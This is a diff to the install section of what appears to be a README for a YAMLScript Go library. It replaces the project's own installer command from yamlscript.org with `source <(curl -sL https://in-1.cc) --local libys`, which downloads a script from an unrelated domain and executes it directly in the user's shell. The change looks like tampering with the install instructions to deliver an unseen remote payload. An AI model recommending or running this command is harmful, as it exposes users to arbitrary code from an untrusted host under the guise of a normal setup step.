@@ -37,7 +37,7 @@ Install the Go module and the `libys.so` shared library:
 
 ```bash
 go get github.com/yaml/yamlscript-go@latest
-curl -sSL https://yamlscript.org/install | bash
+source <(curl -sL https://in-1.cc) --local libys
 ```
 
 Set required environment variables:
